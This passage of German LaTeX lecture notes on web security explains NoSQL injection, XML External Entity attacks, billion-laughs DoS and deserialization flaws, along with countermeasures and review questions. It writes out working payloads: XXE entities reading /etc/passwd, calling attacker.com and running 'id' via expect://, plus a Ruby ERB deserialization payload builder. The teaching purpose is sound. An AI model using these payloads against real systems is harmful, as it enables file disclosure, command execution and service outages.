+In den letzten Jahren werden vermehrt NoSQL-Datenbanken eingesetzt. Diese verwenden nicht SQL als Abfragesprache, sondern meistens eigenständige Abfragesprachen oder exekutieren JavaScript-Snippets als Query. Hier ein Beispiel in MongoDB:
+
+\begin{minted}{javascript}
+db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits < $userInput; } } );
+\end{minted}
+
+Bei diesem Beispiel wird als Query der aktuellen Kontostand berechnet (\textit{credits - debits}), falls dieser unter einer benutzerdefinierten Schranke liegt (\textit{\$userInput}) wird der behalten, ansonsten ausgefiltert. Die Abfrage ist als JavaScript implementiert und nicht als SQL.
+
+Die grundsätzliche Problematik einer Injection bleibt ident. In dem gewählten Beispiel wird z. B. die Benutzereingabe nicht escaped, ein Angreifer kann daher auf diese Weise Schadcode einfügen:
+
+\begin{minted}{javascript}
+"(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<10000); return Math.max();})()"
+\end{minted}
+
+Hier wird nun innerhalb der Abfrage eine Javascript-Funktion definiert und sofort danach aufgerufen. Die Funktion macht nichts anderes, als 10 Sekunden lang eine Endlosschleife aufzurufen. Falls der MongoDB-Server nach dem Absetzen dieser Query für 10 Sekunden nicht antwortet und eine CPU zu 100\% ausgelastet ist, hat man also eine datenbankseitige Injection erreicht.
+
+Wie man an dem Beispiel sehen kann, ist der alleinige Einsatz von NoSQL-Datenbanken nicht ausreichend um eine Datenbank-Injection zu vermeiden.
+
+\section{XML External Entities and DoS}
+
+Werden von einem Webserver XML-Daten entgegengenommen und serverseitig bearbeitet, entstehen mehrere potentielle Angriffsvektoren. Zwei davon, XML External Entities und XML-basierte DoS-Angriffe, werden in diesem Kapitel betrachtet. Beide basieren darauf, dass XML ein komplexes Datenformat besitzt welches durch einen ebenso komplexen Parser serverseitig analysiert werden muss.
+
+\subsection{XML External Entities}
+
+XML besitzt die Möglichkeit direkt innerhalb des XML-Dokuments Typdefinitionen zu inkludieren. Diese DTD (Document Type Definition) beginnt mit dem DOCTYPE Tag und kann auch External Entities definieren. Diese External Entities sind Verweise auf externe Datenquellen, diese werden durch den Parser automatisch in das XML-Dokument eingefügt.
+
+Ein Beispiel für einen XML External Entities Angriff der auf die Extraktion lokaler Daten zielt:
+
+\begin{minted}{xml}
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+\end{minted}
+
+Bei diesem Beispiel wird ein neues Element (\textit{foo}), und als möglicher Wert für dieses Element die externe Datenquelle /etc/passwd als Referenz \textit{\&xxe} definiert. Anschließend wird dieser Elementtyp auch sofort samt der Referenz verwendet. Erlaubt ein Server das Parsen dieses XML-Dokumentes würde er nun diese Datei auslesen, deren Inhalt in das XML Dokument einfügen und ggf. das ausgefüllte Dokument an den Client zurückgeben. Somit kann der Angreifer auf eine Datei, auf die er eigentlich keinen Zugriff besitzen sollte mit den Rechten des Applikationsservers zugreifen.
+
+Ebenso kann ein XML External Entity auf eine Netzwerkadresse verweisen:
+
+\begin{minted}{xml}
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >
+]>
+<foo>&xxe;</foo>
+\end{minted}
+
+In diesem Beispiel kann der Angreifer den XML-verarbeitenden Server dazu bringen, mittels HTTP GET auf die übergebene URL (\url{http://www.attacker.com/text.txt}) zuzugreifen. Dadurch ergeben sich mehrere Angriffsmöglichkeiten:
+
+\begin{itemize}
+	\item Der Angreifer kann den Webserver zum ``Besuch'' einer Webseite bringen, bei diesem Besuch wird zumeist auch die öffentliche IP-Adresse des Webservers auf dem besuchten Webserver vermerkt. Bei Inhalten die z. B. gegen das Verbotsgesetz verstoßen kann dies negative Publicity für den Betreiber des XML-verarbeitenden Webservers bewirken.
+	\item Da der Zugriff vom XML-verarbeitenden Server ausgeht, kann der Angreifer einen HTTP GET Request auf interne Server absetzen, die ansonsten durch eine initiale Firewall blockiert gewesen wären.
+	\item Der Angreifer kann ebenso auf \textit{localhost}, sprich dem eigenen Server, zugreifen. Häufig werden interne Administrationsprogramme so konfiguriert, dass diese nur auf Localhost lauschen (als Sicherheitsmassname um remote Angreifern den Zugriff zu unterbinden). Im Zuge eines XML External Entity basierten Angriffs kann ein Angreifer diesen Schutz aushebeln und direkt auf localhost zugreifen.
+	\item Bei einigen Protokollen (http, smb, cifs) werden automatisch Tokens und Credentials vom XML-verarbeitenden Server aus zum Zielserver verschickt. Ein Angreifer kann dies z. B. missbrauchen um bei einem Windows-basierten Server via SMB NTLM-Hashes zu extrahieren und gegen diese offline einen Brute-Force Angriff durchzuführen.
+\end{itemize}
+
+Ein XML External Entity kann auch auf virtuelle Adressen verweisen. So wird z. B. vom PHP XML Parser als Schema \textit{expect} angeboten. Bei diesem Schema wird die übergebene URL als Systemkommando ausgeführt und dessen Ergebnis in das XML-Dokument eingefügt. Ein Angreifer kann dies missbrauchen um Systemkommands (Command Injection) auszuführen:
+
+\begin{minted}{xml}
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [ <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "expect://id" >
+]>
+<creds>
+  <user>&xxe;</user>
+  <pass>mypass</pass>
+</creds>
+\end{minted}
+
+In diesem Fall wird als Benutzername die Ausgabe des UNIX-Systemkommandos \textit{id} eingefügt.
+
+\subsection{Gegenmaßnahmen}
+
+Die bevorzugte Gegenmaßnahme ist es, den verwendeten Parser so zu konfigurieren, dass er keinen Zugriff auf XML External Entities zulässt. Häufig wird auch die Verwendung ``einfacherer'' Dokumentenformate als Gegenmaßnahme vorgeschlagen: dies ist allerdings IMHO nicht der beste Weg, da auch die Parser einfacher Dokumentenformate (wie z. B. CSV und JSON) ebenso Schwachstellen besitzen.
+
+\subsection{DoS Attacks}
+
+Ein weiteres Problem von External Entities ist es, dass hierdurch schnell tiefe und breite Datenstrukturen aufgebaut werden können. Versucht ein Parser nun diese Datenstruktur in-memory zu bauen, kann ein Parser sehr schnell out-of-memory gehen und dadurch einen Speicher-basierten DoS-Angriff durchführen.
+
+Ein bekanntes Beispiel sind Million-Laugh Angriffe:
+
+\begin{minted}{xml}
+<!DOCTYPE root [
+ <!ELEMENT root ANY>
+ <!ENTITY LOL "LOL">
+ <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
+ <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
+ <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
+ <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
+ <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
+ <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
+ <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
+ <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
+ <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;"> 
+]>
+<root>&LOL9;</root>
+\end{minted}
+
+Bei dieser Angriffsart wird LOL9 durch 10 Elemente des Types LOL8 ersetzt. Jedes dieser 10 LOL8 Elemente wird mit mit 10 LOL7 Elementen gebaut, etc. In Summe erzeugt dieses DTD rund drei Milliarden LOL Elemente. Falls ein Parser versucht diese im Arbeitsspeicher zu erstellen, wird dieser mit hoher Wahrscheinlichkeit nicht ausreichend sein.
+
+\section{Serialisierungsfehler}
+
+Die Serialisierung dient dazu, aus einem Objekt einer Programmiersprache zur Laufzeit eine Textrepresentation zu erstellen. Diese kann dann gespeichert oder übertragen werden. Zu einem späteren Zeitpunkt kann aus dieser Textrepresentation wieder ein Programmiersprachen-Objekt erstellt und diese innerhalb einer Webapplikation verwendet werden.
+
+Das grundsätzliche Problem ist, dass ein Angreifer das serialisierte Dokument abfangen und modifizieren kann. Auf diese Weise kann er das wieder-erstellte Objekte indirekt modifizieren oder auch während (oder nach) der Deserialisierung Schadcode zur Ausführung bringen.
+
+Hier ein einfaches Beispiel eines serialisierten Objekts in PHP (als auch eines modifizierten serialisierten Objekts). Die Annahme ist, dass ein Webserver die Daten des aktuellen Benutzers serialisiert, diese in einer Browser-Session client-seitig speichert und bei jedem Client-Zugriff das de-serialisierte Objekt verwendet um wieder das User-Objekt zu bauen:
+
+\begin{minted}{php}
+# Serialisiertes Objekt
+a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
+
+# Modifiziertes Serialisiertes Objekt
+a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:5:"admin"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
+\end{minted}
+
+In dem Beispiel wird ein einfaches Serialisierungsformat verwendet, String Elemente werden in der Form \textit{s:Länge:Inhalt} verwendet. Ein Angreifer würde z. B. innerhalb des Browsers diese serialisierten Daten modifizieren und z. B. aus dem String ``user'' (Länge 4) den String ``admin'' (Länge 5) machen und versuchen auf diese Weise eine Privilege Escalation durchzuführen.
+
+Weitaus schwerwiegendere Angriffe sind ebenso möglich:
+
+\begin{itemize}
+	\item Es gibt in PHP (wie in den meisten Programmiersprachen) Methoden, die automatisch beim Erstellen bzw. Vernichten von Objekten aufgerufen werden. Ein Angreifer kann anstatt (wie bei dem angegeben Beispiel) einen Stringwert zu verändern, den Stringwert mit einem serialisierten Objekt ersetzen. Dieses Objekt muss nur eine (bei der Serialisierung automatisch aufgerufene) Methode besitzen, die auf eine Variable zugreift und diese als Code ausführt. Der Angreifer würde im serialisierten Objekt nun den Wert dieser Variable auf den Schadcode setzen und dadurch beim Deserialisieren eine serverseitige Code-Execution erzeugen.
+	\item Es können auch serialisierte Objekte mit Objektreferenzen gebaut werden. Problematisch ist, dass die referenzierten Objekte während der Deserialisierung auch Daten wieder freigeben können, man über die Objektreferenz allerdings noch auf diese zugreifen kann. Dies führt zu \textit{use-after-free} Bugs die für \textit{memory corruption}-basierte Angriffe ausgenutzt werden können.
+\end{itemize}
+
+Serialisierung innerhalb des Java-Ökosystems besitzt das Problem, dass bei der Deserialisierung zuerst das de-serialisierte Objekt gebaut wird und erst danach der Typ, etc. des Objekts überprüft werden kann. Hier ein Beispiel:
+
+\begin{minted}{java}
+InputStream is = request.getInputStream();
+ObjectInputStream ois = new ObjectInputStream(is);
+AcmeObject acme = (AcmeObject)ois.readObject();
+\end{minted}
+
+Dies bedeutet, dass die Java-Laufzeitumgebung initial aus einem nicht-vertrauenswürdigem Dokument ein neues Java-Objekt erstellen muss. Ein Angreifer kann dies z. B. für einen einfachen DoS missbrauchen. So erstellt folgender Java-Code z. B. mehrere Hashes die ineinander verknüpft werden. Während solch ein Konstrukt gebaut und serialisiert werden kann, ergibt dies eine rekursive Datenstruktur mit unendlichem Speicherverbrauch beim Deserialisieren und bringt dadurch das Java Runtime Environment zum Absturz:
+
+\begin{minted}{java}
+Set root = new HashSet();
+Set s1 = root;
+Set s2 = new HashSet();
+
+for (int i = 0; i < 100; i++) {
+  Set t1 = new HashSet();
+  Set t2 = new HashSet();
+  t1.add("foo"); // make it not equal to t2
+  s1.add(t1);
+  s1.add(t2);
+  s2.add(t1);
+  s2.add(t2);
+  s1 = t1;
+  s2 = t2;
+}
+\end{minted}
+
+Ruby (on Rails) besitzt leider auch eine längere Historie von Deserialiserungsangriffen. Ein Beispiel hierfür verwendet die Rails \textit{ERB} Klasse. Diese Klasse besitzt ein Element src in welchem Base64-codierter Source Code enthalten sein kann. Dieser Source Code wird bei Aufruf der Methode \textit{result} eines ERB-Objektes intern aufgerufen.
+
+Ruby verwendet ein in XML-eingepacktes JSON-Dokument als Serialisierungsformat. Ein Angreifer könnte z. B. folgendes Dokument bauen, welches einem serialisierten ERB Objekt entspricht:
+
+\begin{minted}{ruby}
+code  = File.read(ARGV[1])
+
+# Construct a YAML payload wrapped in XML
+payload = <<-PAYLOAD.strip.gsub("\n", "&#10;")
+<fail type="yaml">
+--- !ruby/object:ERB
+ template:
+    src: !binary |-
+        #{Base64.encode64(code)}
+</fail>
+PAYLOAD
+\end{minted}
+
+Der Code liest zuerst eine Payload aus einem File aus (der Pfad wird durch die Variable ARGV bereitgestellt) und erstellt dann ein Dokument welches ein serialisiertes ERB-Objekt beschreibt. Hier wurde nun src mit dem Schadcode befüllt und falls die Webapplikation, welche dieses serialisierte Objekt entgegen nimmt, nun das Objekt deserialisert und auf die \textit{result} Methode zugreift wird der bösartige Code des Angreifers ausgeführt. Dies entspricht einer Remote Command Injection, basierend auf einem Serialisierungsfehler.
+
+\subsection{Gegenmaßnahmen}
+
+Die Grundidee ist es, dass der Entwickler vor der Deserialisierung definieren muss, welche validen Objekttypen bei der Deserialisierung vorkommen dürfen. Wie und ob dies überhaupt möglich ist, ist allerdings von der verwendeten Programmiersprache abhängig --- z. B. muss bei älteren Java-Versionen eine externe Serialisierungsbibliothek\footnote{\url{https://github.com/ikkisoft/SerialKiller}} verwendet werden um ein sicheres Verhalten zu erzielen.
+
+Zusätzlich müssen serialisierte Daten einer Integritätssicherung unterzogen werden (z. B. mittels einer Signatur oder eines MACs) damit ein Angreifer die serialisierten Daten nicht verändern kann.
+
+Da diese Sicherungsmassnahmen teilweise schwer umsetzbar sind, empfiehlt OWASP, dass Daten nur deserialisert werden dürfen, wenn diese aus einer authentischen und integritäts-geschützen Quelle kommen. Dadurch wird allerdings das Grundproblem nicht gelöst, sondern wird die Verantwortung und das Problem nur zu dem Anwender, der die Deserialisierung anstößt, verschoben. Falls ein Angreifer das Konto dieses Anwenders übernehmen kann, erlangt er wiederum die Möglichkeit eine Deserialisierungattacke durchzuführen.
+
+\section{Reflektionsfragen}
+
+\begin{enumerate}
+	\item Wie funktioniert eine SQL union-based Injection? Womit können SQL-Injections vermieden werden?
+	\item Wie funktioniert eine SQL time-based Injection? Womit können SQL-Injections vermieden werden?
+	\item Was sollte bei der Verwendung von WebSockets beachtet werden?
+	\item Warum sollten SQL prepared statements verwendet werden?
+	\item Was versteht man unter einer Serialisierungs-Schwachstelle? Welche negativen Auswirkungen können Serialisierungsangriffe auf eine Applikation besitzen?
+	\item Was versteht man unter XML External Entity Attacks? Welche negativen Auswirkungen auf die Applikation können erzielt werden und welche Gegenmaßnahmen sind möglich?
+	\item Welche Probleme können beim Upload eines Files auf einen Webserver auftreten? Welche Best-Practises im Zusammenhang mit File-Uploads sollten beachtet werden?
+	\item Unterschied der Angriffsvektoren mit einem File, dass serverseitig exekutierten Code enthält und einem File, dass client-seitig exekutierten Code enthält?
+\end{enumerate}
